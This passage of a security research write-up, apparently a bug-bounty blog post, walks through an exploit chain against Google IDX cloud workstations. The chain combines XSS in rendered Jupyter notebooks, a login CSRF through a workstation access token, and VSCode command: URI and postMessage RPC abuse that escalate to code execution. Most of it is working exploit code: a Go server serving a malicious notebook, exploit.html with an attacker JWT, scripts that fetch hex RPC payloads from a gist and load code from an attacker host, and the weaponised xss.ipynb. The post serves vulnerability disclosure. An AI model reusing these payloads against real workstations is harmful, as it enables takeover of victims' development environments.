     </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"text/html"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
       </span><span class="s2">"&lt;script&gt;console.log('XSS in : '+ window.origin)&lt;/script&gt;"</span><span class="w">
      </span><span class="p">],</span><span class="w">
      </span><span class="nl">"text/plain"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
     </span><span class="p">},</span><span class="w">
     </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
     </span><span class="nl">"output_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display_data"</span><span class="w">
    </span><span class="p">}</span><span class="w">
   </span><span class="p">],</span><span class="w">
   </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">]</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>In case IDX they are using a sandbox domain to render this <a href="https://0dmducp84q2pdhnsc5mctm6dkrg5796rjm7g95rga4s028s2gn3i.cloudworkstations.googleusercontent.com">https://0dmducp84q2pdhnsc5mctm6dkrg5796rjm7g95rga4s028s2gn3i.cloudworkstations.googleusercontent.com</a></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250730075551.png" alt="Pasted image 20250730075551.png" />
<br />
<code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> wow so this is what we were looking for. As the frame-ancestors directive includes this wildcard domain it‚Äôs possible to use the xss via the Jupyter notebook to iframe the <code class="language-plaintext highlighter-rouge">webWorkerExtensionHostIframe.html</code> endpoint.</p>

<p>But there is one bummer, how can we place a malicious Jupyter notebook file in victim‚Äôs IDX instance.  Sreeram and Sivanesh  again comes to the rescue.</p>

<p>There‚Äôs actually one endpoint I should call it parameter which allows you to specify the location of the <code class="language-plaintext highlighter-rouge">ipynb</code> file which will automatically be fetched and rendered. This was originally found by Project Zero</p>

<center><a href="https://github.com/google/security-research/security/advisories/GHSA-pw56-c55x-cm9m" class="card-preview" data-size="large" target="_blank">
  Loading preview...
</a></center>

<p><br />
<br />
The same parameter also accepted http urls, so an attacker could specify his own server there which will be fetched and when rendered would allow xss. Below is the web server which they used and along with that they also found a RCE gadget related to handling of <code class="language-plaintext highlighter-rouge">command:</code> uris, these are special urls which are handled internally by VSCode you can check the advisory for details it‚Äôs a very cool gadget</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// https://golang.org</span>
<span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="s">"net/http"</span>

<span class="k">const</span> <span class="n">file</span> <span class="o">=</span> <span class="s">`{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "&lt;img src=a onerror=\"let q = document.createElement('a');q.href='command:workbench.action.terminal.new?
%7B%22config%22%3A%7B%22executable%22%3A%22vim%22%2C%22args%22%3A%5B%22%2Fetc%2Fpasswd%22%5D%
7D%7D';document.body.appendChild(q);q.click()\"/&gt;"
   ]
  }
]}`</span>

<span class="k">func</span> <span class="n">Do</span><span class="p">()</span> <span class="p">(</span><span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">http</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">":http-alt"</span> <span class="c">/* 8080 */</span><span class="p">,</span> <span class="n">http</span><span class="o">.</span><span class="n">HandlerFunc</span><span class="p">(</span><span class="k">func</span><span class="p">(</span><span class="n">rw</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">rq</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Header</span><span class="p">()</span><span class="o">.</span><span class="n">Set</span><span class="p">(</span><span class="s">"Access-Control-Allow-Origin"</span><span class="p">,</span> <span class="s">"*"</span><span class="p">)</span>
		<span class="n">rw</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">file</span><span class="p">))</span>
	<span class="p">}))</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">Do</span><span class="p">();</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">command:</code> uri is an interesting attack surface you can find some other blogposts as well related to this  for eg</p>

<center><a href="https://www.sonarsource.com/blog/VSCode-security-markdown-vulnerabilities-in-extensions/" class="card-preview" data-size="large" target="_blank">
  Loading preview...
</a></center>
<p><br />
<br />
VSCode has so many features so if you are able to find an xss in the same origin as the VSCode web then it‚Äôs game over it will be an escalation of XSS to RCE just like we see in Electron application.</p>

<p>In case of IDX it doesn‚Äôt supports external urls :(  we are limited to local filesystem only, so what we do here. Well the duo (Sreeram and Sivanesh) has a solution for this problem as well can you guess what is it? A <strong>Login CSRF</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?payload=%5B%5B%22openFile%22,%22https://%5Bserver_location_goes_here%5D/something.ipynb%22

[["openFile","https://[server_location_goes_here]/something.ipynb"]

Change the location to match the absoule path in local file system 
</code></pre></div></div>

<p>Although the attacker could get an XSS in¬†<code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code>¬†like described above, it is only accessible to the attacker, making it a self-XSS. To exploit it on the victim‚Äôs browser, the attacker needs to exploit a login CSRF in the IDX workstation.</p>

<p>This is possible by using the GET parameter¬†<code class="language-plaintext highlighter-rouge">_workstationAccessToken</code>. When the victim sends a GET request with the attacker‚Äôs <code class="language-plaintext highlighter-rouge">WorkstationJwt</code> cookie in this parameter, they would be able to access the attacker‚Äôs IDX workstation, making the self-XSS exploitable in the victim‚Äôs browser.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kd">var</span> <span class="nx">attacker_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nx">path_to_exploit_ipynb</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/home/shirley/attacker/xss.ipynb</span><span class="dl">"</span><span class="o">|</span>
<span class="kd">var</span> <span class="nx">attacker_workstation_jwt_cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3....</span><span class="dl">"</span>

<span class="kd">var</span> <span class="nx">folder</span> <span class="o">=</span> <span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">))</span>

<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/?payload=[[%22openFile%22,%22VSCode-remote://</span><span class="dl">"</span><span class="o">+</span><span class="nx">path_to_exploit_ipynb</span><span class="o">+</span><span class="dl">"</span><span class="s2">%22]]&amp;_workstationAccessToken=</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_workstation_jwt_cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;folder=</span><span class="dl">"</span><span class="o">+</span><span class="nx">folder</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">vscode-remote</code> scheme actually points to the local file system only</p>

<p>Example final url which  the attacker needs to send to the victim:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev/?payload=[[%22openFile%22,%22VSCode-remote:///home/shirley/attacker/xss.ipynb%22]]&amp;_workstationAccessToken=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3....&amp;folder=/home/shirley/attacker
</code></pre></div></div>
<p>A sweet chain which includes the login CSRF as well the initial XSS which would trigger in the context of <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> origin.</p>

<hr />

<h2 id="putting-everything-together">Putting Everything together</h2>

<blockquote>

  <p>exploit.html</p>
</blockquote>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">openwindow</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">attacker_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">idx-attacker-1722601960617.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev</span><span class="dl">"</span>
    <span class="kd">var</span> <span class="nx">path_to_exploit_ipynb</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/home/user/attacker/xss.ipynb</span><span class="dl">"</span>
    <span class="kd">var</span> <span class="nx">attacker_workstation_jwt_cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2Nsb3VkLmdvb2dsZS5jb20vd29ya3N0YXRpb25zIiwiYXVkIjoiaWR4LWF0dGFja2VyLTE3MjI2MDE5NjA2MTcuY2x1c3Rlci1iZWMyZTQ2MzVuZzQ0dzdlZDIyc2EyMmhlcy5jbG91ZHdvcmtzdGF0aW9ucy5kZXYiLCJpYXQiOjE3MjI2MDIyMDcsImV4cCI6MTcyMjYwMjI2N30.JFihvbvC0vwDI3dEj_K5dMuM6XUaYp6yCdClbIztMQnWRG-GHFmrySbDoQCFUrzmhbMcPGqp0Ftf_n-I2XiLH4t2vdNRL6I3B2XUmjC3y16J-ToqDhXpEE7iXCZWxH6nzhEoJ6JVxlqm23FAZ9inmViV2irtL1BePHPtlBdVP3WJJ0vlJGynvW12xNS9VqAIeo1LjUKSLdmFcSACiYtNVfkzHmqkpwqSowx_VF8Cq6F6YOhwE4sX23p2F_cRsRKBkOecUAc2A-iKFOJ0VbyMeWDOrhV9ayqPuNzab6I_cdoZvSmEDBqgFjxSRg86_yFnMyxwPno4gy8ZuJ3-e8TNTw</span><span class="dl">"</span>

    <span class="kd">var</span> <span class="nx">folder</span> <span class="o">=</span> <span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">path_to_exploit_ipynb</span><span class="p">.</span><span class="nf">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">))</span>
    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/?payload=[[%22openFile%22,%22VSCode-remote://</span><span class="dl">"</span><span class="o">+</span><span class="nx">path_to_exploit_ipynb</span><span class="o">+</span><span class="dl">"</span><span class="s2">%22]]&amp;_workstationAccessToken=</span><span class="dl">"</span><span class="o">+</span><span class="nx">attacker_workstation_jwt_cookie</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;folder=</span><span class="dl">"</span><span class="o">+</span><span class="nx">folder</span><span class="p">;</span>
    <span class="nx">x</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">redirect</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">openwindow()</span><span class="nt">&gt;</span>click<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<p><br />
The variable naming should be self explanatory. It populates the url to include the jwt cookie and the path to the <code class="language-plaintext highlighter-rouge">ipynb</code> file which contains the exploit code. We are opening this url in a new window.</p>

<p>At the same we are also setting up a message listener which is meant for redirecting this page.</p>

<blockquote>

  <p>script1.js</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Change this value to the victim's IDX workstation domain</span>
<span class="kd">var</span> <span class="nx">victim_idx_workstation_domain</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">idx-victim-1722601902976.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev</span><span class="dl">'</span>

<span class="nx">parentOrigin</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span>

<span class="nx">ifr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">ifr</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="o">+</span><span class="nx">victim_idx_workstation_domain</span><span class="o">+</span><span class="dl">"</span><span class="s2">/oss-6a96d5dc452450b1ad67667c4e503a014ef0a908/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?parentOrigin=</span><span class="dl">"</span><span class="o">+</span><span class="nx">parentOrigin</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ifr</span><span class="p">)</span>

<span class="c1">// --- start utils ---</span>

<span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

<span class="c1">// Converts hex to ArrayBuffer</span>
<span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="p">})).</span><span class="nx">buffer</span>
<span class="p">}</span>

<span class="c1">// Converts ArrayBuffer to hex</span>
<span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Returns text output of a fetch response</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}</span>

<span class="c1">// --- end utils ---</span>

<span class="c1">// Initiates postmessage communications</span>
<span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
    <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
    <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">idx.idx-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
    <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
<span class="c1">// Waits for the init message and then calls send_everything()</span>
<span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
    <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
        <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
        <span class="nf">send_everything</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Fetches a list of postmessage data and sends them</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">ms</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">();</span>
    <span class="c1">// One of the postmessages in the below file, contains a link to the JS file which contains the XSS payload that would be executed in the victim's idx workstation</span>
    <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="s2">`https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt?cacheB=</span><span class="p">${</span><span class="nx">ms</span><span class="p">}</span><span class="s2">`</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
    <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
    <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
        <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
        <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Obtains the port information and calls the send_map()</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
        <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
        <span class="nf">send_map</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Everything is same as Matan‚Äôs poc only.</p>

<p><a href="https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt">https://gist.githubusercontent.com/Sudistark/a643a2e8216e5a93f92bde9121333337/raw/b100c95bcb227ad70e64518ff370f3a07cc7a23f/pwn-idx.txt</a> contains the hex encoded serialized rpc messages to trigger the XSS.</p>

<blockquote>

  <p>script2.js</p>
</blockquote>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">)</span> <span class="p">{</span>
   <span class="c1">// Change this to the full URL pointing to the script2.js file</span>
    <span class="kd">var</span> <span class="nx">script_url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://&lt;attacker-host&gt;/script1.js</span><span class="dl">'</span><span class="p">;</span>

    <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">action</span><span class="p">:</span><span class="dl">"</span><span class="s2">redirect</span><span class="dl">"</span><span class="p">,</span><span class="na">url</span><span class="p">:</span><span class="nx">origin</span><span class="p">};</span>
    <span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">sendExploit</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">clearInterval</span><span class="p">(</span><span class="nx">checkLocation</span><span class="p">);</span>
        <span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`&lt;iframe srcdoc="sss&lt;script src='</span><span class="p">${</span><span class="nx">script_url</span><span class="p">}</span><span class="s2">'&gt;&lt;/script&gt;"/&gt;`</span>
    <span class="p">}</span>

    <span class="nx">checkLocation</span> <span class="o">=</span> <span class="nf">setInterval</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">origin</span> <span class="o">==</span> <span class="nx">origin</span><span class="p">){</span>
        <span class="nf">sendExploit</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The exploit code in <code class="language-plaintext highlighter-rouge">ipynb</code> file would execute the above code , it basically loads the <code class="language-plaintext highlighter-rouge">script2.js</code> and also sends a <em>postMessage</em> to the <code class="language-plaintext highlighter-rouge">top.window.opener</code> page which points to the initial exploit.html endpoint. We are redirecting that page to the same <code class="language-plaintext highlighter-rouge">*.cloudworkstations.googleusercontent.com</code> origin as rest of exploitation will be happening there only</p>

<p><code class="language-plaintext highlighter-rouge">top.window.opener.document.body.innerHTM</code> we are also modifying the source of that page to load the <code class="language-plaintext highlighter-rouge">script1.js</code> file there which does the actual exploitation part.</p>

<blockquote>

  <p>xss.ipynb</p>
</blockquote>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"cells"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
   </span><span class="nl">"cell_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"code"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"execution_count"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
   </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
   </span><span class="nl">"outputs"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
     </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"text/html"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"&lt;script src='https://&lt;attacker-host&gt;/script2.js'&gt;&lt;/script&gt;"</span><span class="p">],</span><span class="w">
      </span><span class="nl">"text/plain"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
     </span><span class="p">},</span><span class="w">
     </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
     </span><span class="nl">"output_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display_data"</span><span class="w">
    </span><span class="p">}</span><span class="w">
   </span><span class="p">],</span><span class="w">
   </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="s2">""</span><span class="w">
   </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
 </span><span class="p">],</span><span class="w">
 </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nl">"kernelspec"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
